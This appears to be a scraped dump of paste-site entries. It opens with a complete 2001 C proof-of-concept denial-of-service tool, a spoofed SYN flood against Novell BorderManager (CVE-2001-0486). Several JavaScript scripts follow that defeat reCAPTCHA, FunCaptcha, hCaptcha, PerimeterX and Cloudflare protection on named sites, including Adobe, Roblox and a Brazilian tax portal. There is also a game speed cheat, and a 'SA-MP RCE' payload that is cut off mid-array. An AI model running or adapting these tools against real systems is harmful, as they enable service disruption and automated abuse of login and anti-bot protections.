9zJbvsiy,Novell BorderManager Enterprise Edition 3.5 - Denial of Service - CVE-2001-0486,FlyFar,C,Saturday 24th of February 2024 08:58:43 PM CDT,"/* 29.4.2001 honoriak@mail.ru
   Proof of concept DoS Novell BorderManager Enterprise Edition 3.5
   helisec
   DoSs are lame, i know, but boredom is ugly. DON'T ABUSE.
   greets: jimjones, doing, darkcode for his paper about raw sockets 
   and all helisec guys.
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>  
#include <sys/types.h>
#include <sys/stat.h> 
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#define __FAVOR_BSD
#include <netinet/tcp.h>

#define PORT 353 

 /* to be easier the processing, this struct :) */
 
 struct pseudohdr {
         struct in_addr saddr;
         struct in_addr daddr;
         u_char zero;
         u_char protocol;
         u_short len;
         struct tcphdr tcpheader;
     }pseudoh;
                                    

unsigned long resolve(name)  
	char *name;
 {

struct in_addr h2;
struct hostent *hname;

if (!(hname = gethostbyname(name))) return(0);
memcpy((char *)&h2.s_addr, hname->h_addr, hname->h_length);
return(h2.s_addr);
}
               
 /* checksum ripped and modified by me */
 
u_short
checksum (data, length)
	u_short *data;
	u_short length;
{

register long value;
u_short i;
    
      for (i = 0; i < (length >> 1); i++)
       value += data[i];
          
       if ((length & 1) == 1)
       value += (data[i] << 8);
                
       value = (value & 65535) + (value >> 16);
                  
       return (~value);
}
                    

void packet(vic, socket) 
	struct sockaddr_in *vic;
	int socket;
 {
 
 int count;
 char buf[40];
                     
 struct ip *ipheader = (struct ip *)buf;
 struct tcphdr *tcpheader = (struct tcphdr *)(buf + sizeof(struct ip));
 
 bzero (&buf, (sizeof(struct ip) + sizeof(struct tcphdr)) );
 
 	/* filling ip struct */
 	
 	ipheader->ip_v = IPVERSION;
 	ipheader->ip_hl = 5;
 	ipheader->ip_tos = htons(0);
 	ipheader->ip_len = htons(sizeof(buf));
 	ipheader->ip_id = rand() % 0xffff;
 	ipheader->ip_off = htons(0);
 	ipheader->ip_ttl = 0xff;  /* 255 hex */
 	ipheader->ip_p = IPPROTO_TCP;
 	ipheader->ip_src.s_addr = rand();
 	ipheader->ip_dst.s_addr = vic->sin_addr.s_addr;
 	ipheader->ip_sum = 0;
 	
 	/* filling tcphdr struct */
 	
 	tcpheader->th_sport = 2424; /* random */
 	tcpheader->th_dport = vic->sin_port;
 	tcpheader->th_seq = htonl(0xF1C); /* random */
 	tcpheader->th_ack = 0;
 	tcpheader->th_off = 5;
 	tcpheader->th_flags = TH_SYN; /* the important flag */
 	tcpheader->th_win = 4096;
 	tcpheader->th_sum = 0;   
 	

 bzero (&pseudoh, 12 + sizeof(struct tcphdr));
 pseudoh.saddr.s_addr = rand();
 pseudoh.daddr.s_addr = vic->sin_addr.s_addr;
 pseudoh.protocol = 6;
 pseudoh.len = htons (sizeof(struct tcphdr));
 memcpy((char *)&pseudoh.tcpheader, (char *)tcpheader, sizeof (struct tcphdr));
 tcpheader->th_sum = checksum((u_short *)&pseudoh, 12 + sizeof (struct tcphdr));
  
 /* sending packets, DON'T ABUSE! */

for (count = 0; count < 260; count++) {
  if ( (sendto(socket, 
 	   buf, 
 	   (sizeof(struct iphdr) + sizeof(struct tcphdr)), 
 	   0, 
 	   (struct sockaddr *)vic, 
 	   sizeof(struct sockaddr_in))) < 0) {
 	   fprintf(stderr, ""Error sending packets\n""); 
           exit(-1);
           }              
      }                              	                                                    
close (socket);
  }
 
void usage(proggy) 
	char *proggy;
 {
	fprintf(stderr,""DoS a Novell BorderManager Enterprise Edition 3.5\n"");
	fprintf(stderr, ""honoriak@mail.ru from helisec\n"");
	fprintf(stderr, ""Usage: %s host\n"", proggy);
	exit(0);
	}

main(argc, argv) 
	int argc;
	char *argv[];
	
 {
  
  struct sockaddr_in h;
  int s0ck, uno = 1;
  
  if (argc < 2)
  	{
  	usage(argv[0]);
  	}
  	
  bzero(&h, sizeof(h)); 
  h.sin_family = AF_INET;   
  h.sin_port = htons(PORT); 

if ( (inet_pton(AF_INET, argv[1], &h.sin_addr)) <= 0)
	{
	h.sin_addr.s_addr = resolve(argv[1]);
	}
	
if (!h.sin_addr.s_addr) {
	fprintf(stderr, ""Error resolving host\n"");
	exit(-1);
	}
	
if ((s0ck = socket(AF_INET, SOCK_RAW, 255)) < 0) {
        fprintf(stderr, ""Error creating raw socket, root is needed\n"");
        exit (-1);
        }

setsockopt(s0ck, SOL_SOCKET, SO_BROADCAST, &uno, sizeof(uno));

packet(&h, s0ck);
fprintf(stderr, ""DoS completed.\n"");
exit(0);
}


// milw0rm.com [2001-05-07]
            "
RPLqTQiN,Bypass adobe.com Enterprise Recaptcha V3 at sign-in page,FlyFar,JavaScript,Saturday 24th of February 2024 08:57:01 PM CDT,"//npm install puppeteer fs @antiadmin/anticaptchaofficial
// update your login credentials
// run with command: ""node adobe.js""

//IMPORTANT:
//1. Adobe utilizes Recaptcha Enterprise V3 tokens for sign-in procedure.
//Their JS transmits token in modified header. We replace their obfuscated script with our version,
//where headers object is passed to our function ""formatMyHeaders"".
//When token is solved by Anti Captcha, the header is modified accordingly by adding the v3 token,
//and we manage to successfully sign in.
//2. Several attempts (about 10 times) should be made to sign in successfully.

const anticaptcha = require(""@antiadmin/anticaptchaofficial"");
const pup = require(""puppeteer"");
const fs = require('fs');


//API key for anti-captcha.com
const anticaptchaAPIKey = 'API_KEY_HERE';

//your login in Adobe
const login = 'some@email.com';


const url = 'https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FAdobeStockContributor1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Fcontributor.stock.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%26code_challenge_method%3Dplain%26use_ms_for_expiry%3Dtrue&client_id=AdobeStockContributor1&scope=AdobeID%2Copenid%2Ccreative_cloud%2Ccreative_sdk%2Ccc_private%2Cgnav%2Csao.stock%2Cadditional_info.address.mail_to%2Cadditional_info.dob%2Cread_organizations%2Cread_pc.stock%2Csao.cce_private%2Cportfolio.sdk.import&denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FAdobeStockContributor1%3Fredirect_uri%3Dhttps%253A%252F%252Fcontributor.stock.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%26response_type%3Dtoken&relay=58a9aa05-a15c-4582-b0fa-28c82758e27a&locale=en_US&flow_type=token&ctx_id=contributor_login&idp_flow_type=login#/';
let browser = null;
let page = null;
let token = null;

(async () => {

    anticaptcha.setAPIKey(anticaptchaAPIKey);
    const balance = await anticaptcha.getBalance();
    if (balance <= 0) {
        console.log('Buy your anticaptcha balance!');
        return;
    } else {
        console.log('API key balance is '+balance+', continuing');
        // anticaptcha.shutUp(); //uncomment for silent captcha recognition
    }

    try {
        console.log('opening browser ..');


        let options = {
            headless: false,
            ignoreHTTPSErrors: true,
            devtools: true
        };
        console.log(options);
        browser = await pup.launch(options);


        console.log('creating new page ..');
        page = await browser.newPage();
    } catch (e) {
        failCallback(""could not open browser: ""+e);
        return false;
    }


    await page.setRequestInterception(true);
    page.on('request', (request) => {
        if (request.url().indexOf('scripts.js') !== -1) {
            console.log('aborting '+request.url());
            request.abort();
        } else {
            request.continue();
        }
    });

    console.log('solving captcha');

    try {
        token = await anticaptcha.solveRecaptchaV3Enterprise(url,'6LcGE-4ZAAAAAG2tFdbr7QqpimWAPqhLjI8_O_69',0.9,'');
    } catch (e) {
        failCallback(""could not solve captcha: ""+e);
        return;
    }

    console.log('token is ready: '+token);


    await page.goto(url, {
        waitUntil: ""domcontentloaded""
    });

    console.log('adding script');
    try {

        const path = require('path');
        let file = fs.readFileSync(path.resolve('.', '_adobe.js'), 'utf8');
        //replacing 'RECAPTCHA_TOKEN' placeholder with V3 token
        file = file.replace('RECAPTCHA_TOKEN', token);
        await page.addScriptTag({ content: file });
    } catch (e) {
        console.log('failed to insert script: '+e);
    }

    await delay(3000);

    console.log('filling form ..');

    const input= await page.$(`#EmailPage-EmailField`)
    await input.focus();
    await page.type(`#EmailPage-EmailField`,login)


    await delay(1000);


    console.log('clicking the button');
    await page.click(""#EmailForm > section.EmailPage__submit.mod-submit > div.ta-right > button"");

    console.log(""waiting 10 sec for backend"");
    await delay(10000);


    let htmlContent = await page.$eval('*', el => el.innerText);

    if (htmlContent.indexOf('Confirm your phone number') !== -1 || htmlContent.indexOf('Verify your identity') !== -1) {
        successCallback();
    } else {
        failCallback('control string not found');
    }

})();



function delay(time) {
   return new Promise(function(resolve) {
       setTimeout(resolve, time)
   });
}


function successCallback() {
    console.log('Successfully passed test');
    // console.log('closing browser .. ');
    // browser.close();
}

function failCallback(code) {
    console.log('Failed to pass: '+code);
    // console.log('closing browser .. ');
    // browser.close();
}"
GXmrphJj,Bypass roblox.com Arcoselabs Funcaptcha at sign-in page,FlyFar,JavaScript,Saturday 24th of February 2024 08:55:49 PM CDT,"// Script demonstrates automatic sign in to your Roblox account
// Replace API key, login, password and proxy credentials with your own.
//
// Install packages:
// npm install @antiadmin/anticaptchaofficial puppeteer
//
// run with command: ""node roblox.js""


const ac = require(""@antiadmin/anticaptchaofficial"");
const pup = require(""puppeteer"");


ac.setAPIKey('API_KEY_HERE');
ac.getBalance()
    .then(balance => console.log('my balance is: '+balance))
    .catch(error => console.log('an error with API key: '+error));


const login = 'YOUR_LOGIN';
const password = 'YOUR_PASSWORD';

const proxyAddress = ""11.22.33.44""; //only numbers
const proxyPort = ""1234""
const proxyUser = ""mylogin"";
const proxyPassword = 'mypassword';

//use unique browser agent
let userAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36';
let browser = null;
let tab = null;

(async () => {
try {

    let xfrToken = null;
    let dataBlob = null;

    await prepareBrowser();

    console.log('setting response hook ..');
    //response interception to catch XHR token
    const xfrCatchPromise = new Promise((resolve, reject) => {
        tab.on('response', async (response) => {
            if (response.url() === ""https://auth.roblox.com/v2/login"" && xfrToken == null){
                console.log('XHR response received');
                let result = await response;
                let json = await result.json();

                if (json === null) {
                    reject('JSON is null');
                    return false;
                }

                console.log('intercepted response JSON:')
                console.log(json);
                const dataBlob = json.errors[0][""fieldData""];
                console.log('data blob: '+dataBlob);

                xfrToken = result._request._headers['x-csrf-token'];
                console.log('xfr token: '+xfrToken);
                resolve({xfrToken, dataBlob })
            }
        });
    });


    console.log('opening target page ..');
    //not using waitUntil:""networkidle0"" option, sometimes causes page to never load
    await tab.goto('https://www.roblox.com/newlogin', {waitUntil: ""domcontentloaded""});

    //let everything load
    console.log('waiting 5 seconds');
    await delay(5000);

    //use this to skip ""accept all cookies"" button
    await tab.click(""#login-username"");
    await delay(1000);

    console.log('filling login ..');
    await tab.click(""#login-username"");
    await tab.keyboard.type(login,{delay: 100});

    console.log('filling password ..');
    await tab.click(""#login-password"");
    await tab.keyboard.type(password,{delay: 100});

    await delay(5000);
    console.log('submitting form ..');

    [_, { xfrToken, dataBlob } ] = await Promise.all([
        tab.click(""#login-button""),
        xfrCatchPromise,
    ]);

    const dataBlobObject = JSON.parse(dataBlob);

    if (typeof dataBlobObject.unifiedCaptchaId === ""undefined"" || xfrToken === null) {
        throw new Error(""something went wrong"");
    }

    const token = await solveArkoselabsCaptcha(dataBlobObject.dxBlob);
    console.log('Funcaptcha token from Anti-Captcha: '+token);

    const user = await makeAJAXRequestWithXFR(xfrToken, dataBlobObject.unifiedCaptchaId, token);
    if (user.user.name === login) console.log('completed successfully');
    else console.log('wrong user name');


} catch (e) {
    console.error('could not complete requests: '+e.toString())
}

browser.close();

})();



function delay(time) {
   return new Promise(function(resolve) {
       setTimeout(resolve, time)
   });
}

async function prepareBrowser() {
    try {
        console.log('opening browser ..');
        let options = {
            headless: true, //set to false if you want to see what's going on with the browser
            ignoreHTTPSErrors: true,
            devtools: false, //enable for debugging
            ignoreDefaultArgs: [""--disable-extensions"",""--enable-automation""],
            args: [
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--allow-running-insecure-content',
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--mute-audio',
                '--no-zygote',
                '--no-xshm',
                '--window-size=1920,1080',
                '--no-first-run',
                '--no-default-browser-check',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--enable-webgl',
                '--ignore-certificate-errors',
                '--lang=en-US,en;q=0.9',
                '--password-store=basic',
                '--disable-gpu-sandbox',
                '--disable-software-rasterizer',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-renderer-backgrounding',
                '--disable-infobars',
                '--disable-breakpad',
                '--disable-canvas-aa',
                '--disable-2d-canvas-clip-aa',
                '--disable-gl-drawing-for-tests',
                '--enable-low-end-device-mode'
            ]
        };
        if (proxyAddress && proxyPort) {
            options[""args""].push(`--proxy-server=${proxyAddress}:${proxyPort}`);
        }
        browser = await pup.launch(options);

        console.log('creating new tab ..');
        tab = await browser.newPage();
    } catch (e) {
        console.log(e);
        return false;
    }


    if (proxyPassword && proxyUser) {
        console.log(`setting proxy authentication ${proxyPassword}:${proxyUser}`);
        await tab.authenticate({
            username: proxyUser,
            password: proxyPassword,
        });
    }

    await tab.setUserAgent(userAgent);
    await tab.setViewport({width: 1920, height: 1080});

    await tab.setRequestInterception(true);

    tab.on('request', request => {

       // preventing single-use dataBlob to be spent
       if (request.url().indexOf('public_key/476068BF-9607-4799-B53D-966BE98E2B81') !== -1) {
           console.log('Aborting URL request:' + request.url());
           request.abort();
       } else {
           request.continue();
       }
    });

    return true;

}

async function solveArkoselabsCaptcha(dataBlob) {

    ac.settings.funcaptchaApiJSSubdomain = 'roblox-api.arkoselabs.com';
    ac.settings.funcaptchaDataBlob = dataBlob;
    try {


        return await ac.solveFunCaptchaProxyOn(
            'https://www.roblox.com/login',
            '476068BF-9607-4799-B53D-966BE98E2B81',
            'http',
            proxyAddress,
            proxyPort,
            proxyUser,
            proxyPassword,
            userAgent);


    } catch (e) {
        throw new Error('Captcha not solved');
    }
}

async function makeAJAXRequestWithXFR(xfrToken, captchaId, token) {

    const evalParams = {
        captchaId,
        login,
        password,
        xfrToken,
        token
    };

    //access to console log
    tab.on('console', msg => console.log('PAGE LOG:', msg.text()));

    const userJSON =
        await tab.evaluate(async (evalParams) => {
            return new Promise((resolve, reject) => {

                console.log('making ajax call with login ' + evalParams.login + ', password ' + evalParams.password + ', XFR token ""' + evalParams.xfrToken + '"" and funcaptcha token ""' + evalParams.token + '""');
                fetch('https://auth.roblox.com/v2/login', {
                    method: ""POST"",
                    body: JSON.stringify({
                        ""captchaId"": evalParams.captchaId,
                        ""cvalue"": evalParams.login,
                        ""ctype"": ""Username"",
                        ""password"": evalParams.password,
                        ""captchaToken"": evalParams.token
                    }),
                    headers: {
                        'Content-Type': 'application/json;charset=UTF-8',
                        'Accept': 'application/json, text/plain, */*',
                        'x-csrf-token': evalParams.xfrToken
                    }
                }).then(response => response.json())
                  .then(resultJSON => {


                    console.log('JSON result:')
                    console.log(resultJSON);

                    if (resultJSON.errors) {
                        if (resultJSON.errors[0][""code""] === 2) {
                            console.log('did not pass captcha');
                            reject('did not pass captcha');
                            return false;
                        }
                        if (resultJSON.errors[0][""code""] === 0) {
                            console.log('Token Validation Failed');
                            reject('Token Validation Failed');
                            return false;
                        }
                        console.log('unknown error: ' + resultJSON.errors[0][""message""]);
                        reject(resultJSON.errors[0][""message""]);
                        return false;
                    }
                    if (resultJSON.user) {
                        console.log('captcha accepted, user object is included in response');
                        resolve(resultJSON);
                        return true;
                    } else {
                        resolve('user object not found');
                        return false;
                    }

                }).catch(err => {
                    console.log('catched AJAX error: ' + err.toString());
                    reject('catched AJAX error: ' + err.toString())
                });


            });


        }, evalParams);

    console.log('completed successfully');
    console.log(userJSON);
    return userJSON;


}
"
pDzgbKVY,Bypass nfe.fazenda.gov.br HCaptcha Enterprise,FlyFar,JavaScript,Saturday 24th of February 2024 08:54:29 PM CDT,"/*

fazenda.gov.br bypass example with Anti Captcha.

IMPORTANT!
1. Make sure ""const userAgent"" is same as in your Chromium instance
2. Set your API key (""apiKey"")
3. Set correct form password value (""formPassword"")
4. The page is using Hcaptcha Enterprise. This is why we do several attempts to bypass the screen (howManyTestsToMake value).
5. If you want to see what's happening, replace ""headless: true"" with ""headless: false"".

Install dependencies:

npm install @antiadmin/anticaptchaofficial puppeteer


* */


const pup = require('puppeteer')

const anticaptcha = require(""@antiadmin/anticaptchaofficial"");

//screen with captcha
const captchaUrl = 'https://www.nfe.fazenda.gov.br/portal/consultaRecaptcha.aspx?tipoConsulta=resumo&tipoConteudo=7PhJ+gAVw2g=';

//address behind captcha
const checkUrl = 'https://www.nfe.fazenda.gov.br/portal/consultaResumo.aspx?tipoConteudo=7PhJ+gAVw2g=';

//Anti-captcha.com API key
const apiKey = 'API_KEY_HERE';

const formPassword = '44_DIGIT_CODE_HERE_44_DIGIT_CODE_HERE_44_DIG';

const howManyTestsToMake = 10;

let browser = null;
let page = null;
let success = 0;
let fail = 0;
let userAgent = '';

// STOP! IMPORTANT! Shared proxy services won't work!
// Use ONLY self-installed proxies on your own infrastructure! Instruction: https://anti-captcha.com/apidoc/articles/how-to-install-squid
const proxyAddress = '1.2.3.4';
const proxyPort = 1234;
const proxyLogin = 'login';
const proxyPassword = 'pass';

(async () => {

    anticaptcha.setAPIKey(apiKey);
    anticaptcha.shutUp(); //comment for verbose captcha recognition
    const balance = await anticaptcha.getBalance();
    if (balance <= 0) {
        console.log('Topup your anti-captcha.com balance!');
        return;
    } else {
        console.log('API key balance is '+balance+', continuing');
    }

    for (let i=0;i<howManyTestsToMake;i++) {

        console.log(""\nSolving HCaptcha with Anti-Captcha.Com .."");

        let hcaptchaResponse = null;
        try {
            hcaptchaResponse = await anticaptcha.solveHCaptchaProxyOn(
                captchaUrl,
                'e72d2f82-9594-4448-a875-47ded9a1898a',
                'http',
                proxyAddress,
                proxyPort,
                proxyLogin,
                proxyPassword,
                '',
                '',
                {}
            );
            userAgent = anticaptcha.getHcaptchaUserAgent();
        } catch (e) {
            console.error(""could not solve captcha: "" + e.toString());
            return;
        }
        console.log('hcaptchaResponse:', hcaptchaResponse);


        try {
            console.log('opening browser ..');


            let options = {
                headless: false,
                ignoreDefaultArgs: [""--disable-extensions"", ""--enable-automation""],
                devtools: true,
                args: [
                    `--proxy-server=${proxyAddress}:${proxyPort}`,
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--allow-running-insecure-content',
                    '--disable-blink-features=AutomationControlled',
                    '--no-sandbox',
                    '--mute-audio',
                    '--no-zygote',
                    '--no-xshm',
                    '--window-size=1920,1080',
                    '--no-first-run',
                    '--no-default-browser-check',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--enable-webgl',
                    '--ignore-certificate-errors',
                    '--lang=en-US,en;q=0.9',
                    '--password-store=basic',
                    '--disable-gpu-sandbox',
                    '--disable-software-rasterizer',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-infobars',
                    '--disable-breakpad',
                    '--disable-canvas-aa',
                    '--disable-2d-canvas-clip-aa',
                    '--disable-gl-drawing-for-tests',
                    '--enable-low-end-device-mode',
                    '--no-sandbox'
                ]
            };
            browser = await pup.launch(options);


            console.log('creating new page ..');
            page = await browser.newPage();

            console.log('setting browser user agent to ',userAgent);
            await page.setUserAgent(userAgent);

            await page.evaluateOnNewDocument(() => {
                delete navigator.__proto__.webdriver;
            });

            if (proxyPassword && proxyLogin) {
                console.log(`setting proxy authentication ${proxyLogin}:${proxyPassword}`);
                await page.authenticate({
                    username: proxyLogin,
                    password: proxyPassword,
                });
            }
        } catch (e) {
            console.error(""could not open browser: "" + e);
            return false;
        }

        //screen size
        await page.setViewport({width: 1360, height: 1000});


        try {
            await page.goto(captchaUrl, {
                waitUntil: ""networkidle0"",
                timeout: 300000
            });
        } catch (e) {
            console.log('err while loading the page: ' + e);
        }

        console.log('Filling h-captcha-response');
        await page.evaluate(async (hcaptchaResponse) => {

            document.getElementsByName('h-captcha-response')[0].value = hcaptchaResponse;

        }, hcaptchaResponse);

        console.log('Filling password ',formPassword);
        await page.type('#ctl00_ContentPlaceHolder1_txtChaveAcessoResumo', formPassword);


        console.log('Waiting 3 seconds...');
        await delay(3000);

        console.log('Submitting form');
        await page.click('#ctl00_ContentPlaceHolder1_btnConsultarHCaptcha');


        console.log('Waiting 3 seconds...');
        await delay(3000);


        console.log('Checking if we are on correct page');
        let currentUrl = await page.evaluate(async () => {
            return new Promise((resolve => {
                resolve(document.location.href);
            }))
        });
        if (currentUrl === checkUrl) {
            console.log('SUCCESS: We are on the target page ' + checkUrl);
            success++;
        } else {
            console.log('FAIL: We are not on the target page: ' + currentUrl);
            await anticaptcha.reportIncorrectHcaptcha();
            fail++;
        }

        console.log('success = ',success);
        console.log('fail = ',fail);


        await delay(3000);

        await browser.close();

    }



})();

function delay(time) {
   return new Promise(function(resolve) {
       setTimeout(resolve, time)
   });
}"
Mh64XK4y,Bypass Wallmart's PerimeterX screen using an AntiGate template,FlyFar,JavaScript,Saturday 24th of February 2024 08:52:52 PM CDT,"/*

Perimeter bypass.
Install dependencies:

npm install puppeteer @antiadmin/anticaptchaofficial

Run in head-on mode:
node perimeterx.js

* */

const anticaptcha = require(""@antiadmin/anticaptchaofficial"");
const pup = require('puppeteer');

//Anti-captcha.com API key
const apiKey = 'API_KEY_HERE';

//control address with PerimeterX captcha
const url = 'https://www.walmart.com/blocked?url=L3Byb2R1Y3QvOTU0MjE4MjUyL3NlbGxlcnM=&uuid=9957eb60-f319-11eb-afcc-5b8dc3dc9e62&vid=98d54de1-f319-11eb-8873-ed95dbe093ae&g=b';

let browser = null;
let page = null;


(async () => {

    anticaptcha.setAPIKey(apiKey);
    const balance = await anticaptcha.getBalance();
    if (balance <= 0) {
        console.log('Topup your anti-captcha.com balance!');
        return;
    } else {
        console.log('API key balance is '+balance+', continuing');
        // anticaptcha.shutUp(); //uncomment for silent captcha recognition
    }


    try {
        antigateResult = await anticaptcha.solveAntiGateTask(
            url,
            'Anti-bot screen bypass',
            {
                ""css_selector"": "".sign-in-widget"" //this CSS selector '.sign-in-widget' is present only at the captcha page
            });
    } catch (e) {
        console.error(""could not solve captcha: ""+e.toString());
        return;
    }


    const fingerPrint = antigateResult.fingerprint;

    try {
        console.log('opening browser ..');


        let options = {
            headless: false,
            ignoreHTTPSErrors: true,
            devtools: true,
            args: [
                '--window-size='+fingerPrint['self.screen.width']+','+fingerPrint['self.screen.height']
            ]
        };
        browser = await pup.launch(options);

        console.log('creating new page ..');
        page = await browser.newPage();
    } catch (e) {
        console.log(""could not open browser: ""+e);
        return false;
    }

    //screen size
    console.log('setting view port to '+fingerPrint['self.screen.width']+'x'+fingerPrint['self.screen.height']);
    await page.setViewport({width: fingerPrint['self.screen.width'], height: fingerPrint['self.screen.height']});

    //user agent
    let userAgent = '';
    if (fingerPrint['self.navigator.userAgent']) {
        userAgent = fingerPrint['self.navigator.userAgent'];
    } else {
        if (fingerPrint['self.navigator.appVersion'] && fingerPrint['self.navigator.appCodeName']) {
            userAgent = fingerPrint['self.navigator.appCodeName'] + '/' + fingerPrint['self.navigator.appVersion']
        }
    }
    console.log('setting browser user agent to '+userAgent);
    await page.setUserAgent(userAgent);

    console.log('setting cookies');
    let cookies = [];
    for (const name in antigateResult.cookies) {
        cookies.push({ name: name, value: antigateResult.cookies[name], domain: antigateResult.domain })
    }
    await page.setCookie(...cookies);


    try {
        await page.goto(antigateResult.url, {
            waitUntil: ""networkidle0""
        });
    } catch (e) {
        console.log('err while loading the page: '+e);
    }


    console.log('done');



})();"
BQCHgEYR,Bypass CloudFlare with strong filters (SSL handshake fingerprint),FlyFar,JavaScript,Saturday 24th of February 2024 08:51:04 PM CDT,"/*

Cloudflare bypass with AntiBotCookieTask from Anti-Captcha.com.
Install dependencies:

npm install @antiadmin/anticaptchaofficial puppeteer


* */

const anticaptcha = require(""@antiadmin/anticaptchaofficial"");
const pup = require('puppeteer');

//address behind cloudflare
const checkUrl = 'https://www.sportsbikeshop.co.uk/';
const domainName = 'www.sportsbikeshop.co.uk';


//Anti-captcha.com API key
const apiKey = 'API_KEY_HERE';

// STOP! IMPORTANT! Shared proxy services won't work!
// Use ONLY self-installed proxies on your own infrastructure! Instruction: https://anti-captcha.com/apidoc/articles/how-to-install-squid
// Again and again people people insist they have best purchased proxies. NO YOU DO NOT!
// Absolutely recommended to read this FAQ about proxies: https://anti-captcha.com/faq/510_questions_about_solving_recaptcha_with_proxy__applies_to_funcaptcha__geetest__hcaptcha_


const proxyAddress = '1.2.3.4';
const proxyPort = 1234;
const proxyLogin = 'mylogin';
const proxyPassword = 'mypass';


let browser = null;
let page = null;


(async () => {

    anticaptcha.setAPIKey(apiKey);
    const balance = await anticaptcha.getBalance();
    if (balance <= 0) {
        console.log('Topup your anti-captcha.com balance!');
        return;
    } else {
        console.log('API key balance is '+balance+', continuing');
        // anticaptcha.shutUp(); //uncomment for silent captcha recognition
    }

    let antigateResult = null;
    try {
        antigateResult = await anticaptcha.solveAntiBotCookieTask(
            checkUrl,
            proxyAddress,
            proxyPort,
            proxyLogin,
            proxyPassword);
    } catch (e) {
        console.error(""could not solve captcha: ""+e.toString());
        return;
    }

    const fingerPrint = antigateResult.fingerprint;

    try {
        console.log('opening browser ..');


        let options = {
            headless: true, //disable to see the browser window
            devtools: false, //enable to see developers console
            args: [
                '--window-size='+fingerPrint['self.screen.width']+','+fingerPrint['self.screen.height'],
                `--proxy-server=${proxyAddress}:${proxyPort}`
            ],

        };
        browser = await pup.launch(options);

        console.log('creating new page ..');
        page = await browser.newPage();
    } catch (e) {
        console.log(""could not open browser: ""+e);
        return false;
    }

    if (proxyPassword && proxyLogin) {
        console.log(`setting proxy authentication ${proxyLogin}:${proxyPassword}`);
        await page.authenticate({
            username: proxyLogin,
            password: proxyPassword,
        });
    }

    //screen size
    console.log('setting view port to '+fingerPrint['self.screen.width']+'x'+fingerPrint['self.screen.height']);
    await page.setViewport({width: fingerPrint['self.screen.width'], height: fingerPrint['self.screen.height']});

    //user agent
    let userAgent = '';
    if (fingerPrint['self.navigator.userAgent']) {
        userAgent = fingerPrint['self.navigator.userAgent'];
    } else {
        if (fingerPrint['self.navigator.appVersion'] && fingerPrint['self.navigator.appCodeName']) {
            userAgent = fingerPrint['self.navigator.appCodeName'] + '/' + fingerPrint['self.navigator.appVersion']
        }
    }
    console.log('setting browser user agent to '+userAgent);
    await page.setUserAgent(userAgent);

    console.log('setting cookies', antigateResult.cookies);
    let cookies = [];
    for (const name in antigateResult.cookies) {
        cookies.push({ name: name, value: antigateResult.cookies[name], domain: domainName })
    }
    await page.setCookie(...cookies);

    try {
        await page.goto(antigateResult.url, {
            waitUntil: ""networkidle0""
        });
    } catch (e) {
        console.log('err while loading the page: '+e);
    }

    const htmlContent = await page.content();
    console.log(""page content:\n\n"", htmlContent);


})();"
aMPQ9iJC,Speed Script,LSJiqueue,Lua,Saturday 24th of February 2024 08:35:17 PM CDT,"local localPlayer = game:GetService(""Players"").LocalPlayer
local uis = game:GetService(""UserInputService"")
local isRunning = false 
local multiplier = 1 
task.spawn(function()
	local hint = Instance.new(""Hint"", workspace)
	hint.Text = ""Speed Loaded by LSJiqueue!""
	task.wait(2)
	hint:Destroy()
end)


uis.InputBegan:Connect(function(i, gp)
	if gp then return end 
	if i.KeyCode == Enum.KeyCode.Z then 
		isRunning = true 
		while isRunning do 
			task.wait()
			localPlayer.Character:FindFirstChild(""HumanoidRootPart"").CFrame = localPlayer.Character:FindFirstChild(""HumanoidRootPart"").CFrame + localPlayer.Character:FindFirstChild(""HumanoidRootPart"").CFrame.lookVector * multiplier
		end
	end
end)
uis.InputEnded:Connect(function(i, gp)
	if gp then return end 
	if i.KeyCode == Enum.KeyCode.Z then 
		isRunning = false
	end
end)"
AvEyPbdb,CloudStreamPlugins - kronch,Freitez93,JSON,Saturday 24th of February 2024 08:05:04 PM CDT,"{
    ""name"": ""kronch Repository"",
    ""description"": ""Kronch Repository"",
    ""manifestVersion"": 1,
    ""pluginLists"": [
        ""https://raw.githubusercontent.com/Stormunblessed/kronch-ext/builds/plugins.json""
    ]
}"
YUdPjSVZ,Mad,Unknown_No_1,PHP,Saturday 24th of February 2024 07:42:58 PM CDT,FreeHacksJoinTelegramMadGamerTG
tk0CMKZ9,SA-MP RCE,evgen1137,Pawn,Saturday 24th of February 2024 06:53:29 PM CDT,"// © blast.hk
#define FILTERSCRIPT
#include <a_samp>
#include <Pawn.RakNet>

new const RPC_ShowDialog = 61;
new const RPC_ScrSetGravity = 146;

new payload1[] =
{
//          +0    +1    +2    +3    +4    +5    +6    +7    +8    +9   +10   +11   +12   +13   +14   +15
/* 000 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
/* 016 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
/* 032 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
/* 048 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
